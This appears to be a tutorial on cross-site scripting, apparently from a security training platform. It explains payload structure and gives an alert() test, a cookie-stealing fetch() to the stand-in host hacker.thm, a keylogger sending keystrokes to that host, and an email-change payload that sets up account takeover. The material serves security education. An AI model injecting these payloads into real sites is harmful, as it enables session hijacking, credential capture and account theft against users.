## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a type of injection attack where malicious JavaScript is injected into a web application with the intention of being executed in the browsers of other users. This can lead to a wide variety of attacks ranging from session hijacking to manipulation of web content and keylogging.

---

## XSS Payloads

An XSS payload is the JavaScript code that an attacker wants to execute in a victim's browser. Payloads typically have two core components:

- **Intention**: The desired outcome or effect of the JavaScript (e.g., stealing cookies, logging keys, etc.).
- **Modification**: The adaptations or encoding needed to successfully deliver and execute the payload in a specific context or environment.

---

## Testing for XSS Vulnerabilities

A basic test for XSS is to check if arbitrary JavaScript can be injected and executed on a web page. A common proof-of-concept payload is:

```html
<script>alert('1');</script>
```

If this script executes and displays a browser alert, the site is vulnerable to XSS.

---

## Common Malicious XSS Payloads

### 1. Session Stealing

Web sessions often store authentication tokens in cookies. A malicious actor can exfiltrate cookies using the following payload:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

- `document.cookie` retrieves the current cookies.
- `btoa()` base64-encodes the cookie for safe transmission.
- The data is then sent via `fetch()` to an attacker-controlled endpoint.

### 2. Keylogger

Keyloggers can be implemented via XSS to capture everything a user types:

```html
<script>
document.onkeypress = function(e) {
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>
```

Every keystroke is base64-encoded and sent to a remote server controlled by the attacker. This is particularly dangerous on login or payment pages.

### 3. Business Logic Abuse

In some applications, exposed JavaScript functions may provide sensitive functionality. If not secured, these functions can be called maliciously:

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

This payload demonstrates changing a user's email address, potentially enabling the attacker to later perform a password reset attack.

---
